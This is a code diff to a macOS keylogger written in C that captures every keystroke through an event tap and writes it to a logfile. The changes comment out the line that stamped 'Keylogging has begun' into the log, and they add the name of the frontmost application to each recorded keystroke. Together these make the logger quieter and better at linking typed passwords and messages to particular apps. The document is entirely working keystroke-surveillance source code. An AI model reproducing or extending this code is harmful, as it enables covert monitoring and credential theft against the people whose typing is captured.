@@ -42,7 +42,7 @@ int main(int argc, const char *argv[]) {
     }
 
     // Output to logfile.
-    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
+    /* fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result))); */
     fflush(logfile);
 
     // Display the location of the logfile and start the loop.
@@ -69,10 +69,28 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-    // Print the human readable key to the logfile.
-    fprintf(logfile, "%Lf %s\n", (long double)getEpochMilli()/1000, convertKeyCode(keyCode));
-    fflush(logfile);
+    ProcessSerialNumber psn = { 0L, 0L };
+    OSStatus err = GetFrontProcess(&psn);
+    if(err == noErr)
+    {
+        ProcessInfoRec info;
+        StringPtr processName = malloc(64);
 
+        if(processName)
+        {
+            bzero(processName, 64);
+            info.processInfoLength = sizeof(ProcessInfoRec);
+            info.processName = processName;
+            err = GetProcessInformation( &psn, &info);
+            if(err == noErr)
+            {
+                // Print the human readable key to the logfile.
+                fprintf(logfile, "%Lf %s %s\n", (long double)getEpochMilli()/1000, convertKeyCode(keyCode), processName+1);
+            }
+            free(processName);
+        }
+    }
+    fflush(logfile);
     return event;
 }
 
